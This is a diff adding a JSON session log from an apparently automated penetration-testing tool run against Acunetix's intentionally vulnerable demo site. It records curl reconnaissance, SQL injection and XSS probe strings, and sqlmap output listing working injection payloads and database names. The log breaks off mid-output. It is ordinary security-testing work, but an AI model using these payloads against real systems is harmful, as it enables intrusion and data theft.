@@ -1,0 +1,348 @@
+{
+    "session_id": "20260109_222127",
+    "agent_role": "Pentestfull",
+    "input": "http://testphp.vulnweb.com/",
+    "timestamp": "2026-01-09T22:25:50.723078",
+    "results": {
+        "agent_name": "Pentestfull",
+        "input": "http://testphp.vulnweb.com/",
+        "targets": [
+            "http://testphp.vulnweb.com/"
+        ],
+        "targets_count": 1,
+        "tools_executed": 36,
+        "findings": [
+            {
+                "tool": "curl",
+                "args": "-s -I -k -L http://testphp.vulnweb.com/",
+                "command": "/usr/bin/curl -s -I -k -L http://testphp.vulnweb.com/",
+                "success": true,
+                "output": "HTTP/1.1 200 OK\nServer: nginx/1.19.0\nDate: Sat, 10 Jan 2026 01:21:27 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n\n",
+                "timestamp": "2026-01-09T22:21:27.013670",
+                "exit_code": 0
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com/",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/",
+                "success": true,
+                "output": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "timestamp": "2026-01-09T22:21:27.654989",
+                "exit_code": 0
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com//robots.txt",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//robots.txt",
+                "success": true,
+                "output": "<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.19.0</center>\n</body>\n</html>\n",
+                "timestamp": "2026-01-09T22:21:28.086372",
+                "exit_code": 0
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com//sitemap.xml",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//sitemap.xml",
+                "success": true,
+                "output": "<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.19.0</center>\n</body>\n</html>\n",
+                "timestamp": "2026-01-09T22:21:28.575376",
+                "exit_code": 0
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com/ | grep -oE '(action|href|src)=\"[^\"]+\"' | head -30",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/ | grep -oE (action|href|src)=\"[^\"]+\" | head -30",
+                "success": true,
+                "output": "",
+                "timestamp": "2026-01-09T22:21:29.092922",
+                "exit_code": 3
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com/ | grep -oE '<input[^>]+>' | head -20",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/ | grep -oE <input[^>]+> | head -20",
+                "success": true,
+                "output": "",
+                "timestamp": "2026-01-09T22:21:29.752433",
+                "exit_code": 3
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k http://testphp.vulnweb.com/ | grep -oE '<form[^>]+>' | head -10",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/ | grep -oE <form[^>]+> | head -10",
+                "success": true,
+                "output": "",
+                "timestamp": "2026-01-09T22:21:30.192476",
+                "exit_code": 3
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?id=%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?id=%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.735355",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//listproducts.php?cat=%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//listproducts.php?cat=%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.744004",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//artists.php?artist=%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//artists.php?artist=%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.751203",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?id=%27%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?id=%27%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.757689",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//listproducts.php?cat=%27%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//listproducts.php?cat=%27%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.764893",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//artists.php?artist=%27%27\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//artists.php?artist=%27%27 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.771782",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?id=1%27OR%271%27%3D%271\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?id=1%27OR%271%27%3D%271 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.778826",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//listproducts.php?cat=1%27OR%271%27%3D%271\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//listproducts.php?cat=1%27OR%271%27%3D%271 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.785441",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//artists.php?artist=1%27OR%271%27%3D%271\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//artists.php?artist=1%27OR%271%27%3D%271 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.791494",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com/?id=1%20OR%201%3D1\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com/?id=1%20OR%201%3D1 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.798665",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//listproducts.php?cat=1%20OR%201%3D1\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//listproducts.php?cat=1%20OR%201%3D1 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.804737",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//artists.php?artist=1%20OR%201%3D1\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//artists.php?artist=1%20OR%201%3D1 | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:30.811507",
+                "exit_code": 2
+            },
+            {
+                "tool": "sqlmap",
+                "args": "-u \"http://testphp.vulnweb.com//listproducts.php?cat=1\" --batch --level=2 --risk=2 --dbs --threads=5",
+                "command": "/usr/local/bin/sqlmap -u http://testphp.vulnweb.com//listproducts.php?cat=1 --batch --level=2 --risk=2 --dbs --threads=5",
+                "success": true,
+                "output": "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.9.12#pip}\n|_ -| . [)]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 22:21:31 /2026-01-09/\n\n[22:21:31] [INFO] testing connection to the target URL\n[22:21:31] [INFO] checking if the target is protected by some kind of WAF/IPS\n[22:21:31] [INFO] testing if the target URL content is stable\n[22:21:32] [INFO] target URL content is stable\n[22:21:32] [INFO] testing if GET parameter 'cat' is dynamic\n[22:21:32] [INFO] GET parameter 'cat' appears to be dynamic\n[22:21:32] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')\n[22:21:32] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks\n[22:21:32] [INFO] testing for SQL injection on GET parameter 'cat'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y\n[22:21:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[22:21:33] [WARNING] reflective value(s) found and filtering out\n[22:21:34] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"The\")\n[22:21:34] [INFO] testing 'Generic inline queries'\n[22:21:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[22:21:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[22:21:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[22:21:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[22:21:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[22:21:36] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable \n[22:21:36] [INFO] testing 'MySQL inline queries'\n[22:21:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[22:21:37] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)\n[22:21:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[22:21:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[22:21:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[22:21:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[22:21:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[22:21:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[22:21:53] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[22:21:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[22:21:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[22:21:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[22:21:55] [INFO] target URL appears to have 11 columns in query\n[22:21:56] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 3645=3645\n\n    Type: error-based\n    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716b767171,(SELECT (ELT(7121=7121,1))),0x716b6a7071),7121)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=1 AND (SELECT 7897 FROM (SELECT(SLEEP(5)))YYpV)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b767171,0x59434a6f497173564e4d59647452644374705a6b416255456175436a454178744f7859524a6b7973,0x716b6a7071),NULL-- -\n---\n[22:21:56] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.6.40, Nginx 1.19.0\nback-end DBMS: MySQL >= 5.6\n[22:21:59] [INFO] fetching database names\navailable databases [2]:\n[*] acuart\n[*] information_schema\n\n[22:21:59] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 22:21:59 /2026-01-09/\n\n",
+                "timestamp": "2026-01-09T22:21:30.819037",
+                "exit_code": 0
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//search.php?test=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\" | grep -i 'script\\|alert\\|onerror' | head -10",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//search.php?test=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E | grep -i script\\|alert\\|onerror | head -10",
+                "success": true,
+                "output": "HTTP/1.1 200 OK\nServer: nginx/1.19.0\nDate: Sat, 10 Jan 2026 01:22:00 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')</script>'' at line 1",
+                "timestamp": "2026-01-09T22:21:59.489193",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//guestbook.php\" -d \"name=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&text=test\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//guestbook.php -d name=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&text=test | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:21:59.935590",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//search.php?test=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E\" | grep -i 'script\\|alert\\|onerror' | head -10",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//search.php?test=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E | grep -i script\\|alert\\|onerror | head -10",
+                "success": true,
+                "output": "HTTP/1.1 200 OK\nServer: nginx/1.19.0\nDate: Sat, 10 Jan 2026 01:22:00 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')>'' at line 1",
+                "timestamp": "2026-01-09T22:21:59.944512",
+                "exit_code": 6
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//guestbook.php\" -d \"name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E&text=test\" | head -50",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//guestbook.php -d name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E&text=test | head -50",
+                "success": true,
+                "output": "curl: option -50: is unknown\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+                "timestamp": "2026-01-09T22:22:00.388063",
+                "exit_code": 2
+            },
+            {
+                "tool": "curl",
+                "args": "-s -k \"http://testphp.vulnweb.com//search.php?test=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\" | grep -i 'script\\|alert\\|onerror' | head -10",
+                "command": "/usr/bin/curl -s -k http://testphp.vulnweb.com//search.php?test=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E | grep -i script\\|alert\\|onerror | head -10",
+                "success": true,
+                "output": "HTTP/1.1 200 OK\nServer: nginx/1.19.0\nDate: Sat, 10 Jan 2026 01:22:00 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content 